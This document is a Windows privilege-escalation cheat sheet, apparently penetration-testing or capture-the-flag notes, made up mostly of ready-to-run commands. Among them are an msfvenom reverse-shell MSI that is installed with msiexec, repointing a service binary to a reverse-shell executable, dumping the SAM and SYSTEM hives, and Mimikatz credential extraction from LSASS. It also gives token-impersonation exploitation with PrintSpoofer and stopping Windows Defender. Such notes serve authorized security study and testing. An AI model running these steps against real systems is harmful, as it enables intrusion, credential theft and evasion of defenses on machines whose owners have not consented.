### 1. **Basic Enumeration**

```powershell
whoami /priv
whoami /groups
whoami /all
systeminfo
hostname
echo %USERNAME%
echo %USERDOMAIN%
echo %PROCESSOR_ARCHITECTURE%
```

```powershell
# List hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Installed programs
wmic product get name,version
```

---

### 2. **Check for Unquoted Service Paths**

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
sc qc <servicename>
```

Exploit: Place malicious `.exe` in writable path before the space.

---

### 3. **Weak Service Permissions**

```powershell
accesschk64.exe -uwcqv "Authenticated Users" *
accesschk64.exe -uwcqv "Everyone" *
accesschk64.exe -uwcqv "Users" *
```

Exploit: Replace binary or change service config.

```powershell
sc config <service> binPath= "C:\path\to\rev.exe"
sc stop <service>
sc start <service>
```

---

### 4. **AlwaysInstallElevated (MSI abuse)**

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both = `1`, exploit:

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi > evil.msi
msiexec /quiet /qn /i C:\evil.msi
```

---

### 5. **Registry AutoRun / Autorun Hijacks**

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Writable keys = persistence + priv escalation.

---

### 6. **Scheduled Tasks**

```powershell
schtasks /query /fo LIST /v
icacls "C:\path\to\task.exe"
```

If writable, replace binary.

---

### 7. **DLL Hijacking**

- Search for services/apps loading DLLs from writable paths:
    

```powershell
procmon.exe   # (filter by PATH NOT FOUND for .dll)
```

- Place malicious DLL.
    

---

### 8. **Hotfix / Kernel Exploits**

Check system info → Google or use **Windows Exploit Suggester**:

```powershell
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database 2025-08-20-mssb.xls --systeminfo sysinfo.txt
```

---

### 9. **Token Impersonation / SeImpersonatePrivilege**

```powershell
whoami /priv
```

If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled → juicy.  
Exploit with **PrintSpoofer**:

```powershell
PrintSpoofer64.exe -i -c cmd.exe
```

---

### 10. **Password Hunting**

```powershell
# Registry SAM & SYSTEM
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Search for passwords
findstr /si password *.txt *.ini *.xml *.config
```

Common places:

- Unattend.xml (`C:\Windows\Panther\`)
- Group Policy Preference files (`c:\ProgramData\Microsoft\Group Policy\History\`)
- Mimikatz dump creds from LSASS:

```powershell
mimikatz.exe
sekurlsa::logonpasswords
```

---

### 11. **Insecure Services (SYSTEM running user programs)**

```powershell
tasklist /svc
netstat -ano
```

Look for apps running as SYSTEM but writable by user.

---

### 12. **AV & Defender Evasion**

Disable temporarily if perms allow:

```powershell
sc stop WinDefend
```

---

## **Key Tools**

- `winPEAS.exe` → full enumerat
- `Seatbelt.exe` → system survey
- `Accesschk.exe` → permissions
- `Mimikatz` → creds dump    
- `PrintSpoofer` / `JuicyPotato` / `RoguePotato` → token abuse
- `Sherlock.ps1` / `Watson.exe` → vuln checks

---
